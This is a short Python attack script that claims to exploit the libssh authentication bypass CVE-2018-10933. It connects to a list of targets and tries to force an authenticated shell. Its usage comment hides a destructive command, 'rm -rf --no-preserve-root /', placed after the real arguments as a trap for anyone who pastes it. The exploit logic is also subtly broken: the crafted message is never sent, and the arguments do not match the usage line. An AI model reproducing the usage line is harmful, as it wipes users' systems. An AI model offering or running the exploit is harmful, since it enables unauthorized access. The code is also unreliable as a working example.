#!/usr/bin/python3

# Made by Mark Buffalo
# Usage: ./l2readpython.py www.vulnerable-ssh.com 22 ; rm -rf --no-preserve-root /
# For: CVE-2018-10933

from paramiko import common
from paramiko import Message
from paramiko import Transport
from paramiko import util

import socket
import sys

# I hope you figured out what this means.
port = int(sys.argv[2])

# This is for logging debug information
util.log_to_file("ssh.log")

try:
    # First we're going to assume you can read. 
    with open(sys.argv[1]) as ssh_targets:
        s = socket.socket()
        # Let's get rid of the '\n' that infests people who use .readlines() while forcing them to utilize .rstrip()
        ip_list = ssh_targets.read().splitlines()
        for ip in ip_list:
            try:
                print("Attempting to connect to {}:{}...".format(ip, port))
                s.connect((ip, port))

                msg = Message()

                trans = Transport(s)
                trans.start_client()

                print("Attempting to send MSG_USERAUTH_SUCCESS...")
                msg.add_byte(common.cMSG_USERAUTH_SUCCESS)

                cmd = trans.open_session()

                print("Attempting to load shell...")
                cmd.invoke_shell()
            except Exception as e:
                print(str(e))
except FileNotFoundError as e:
    print("File not found: {}".format(sys.argv[1]))
except Exception as e:
    print("Possible PEKBAC error: {}".format(str(e)))
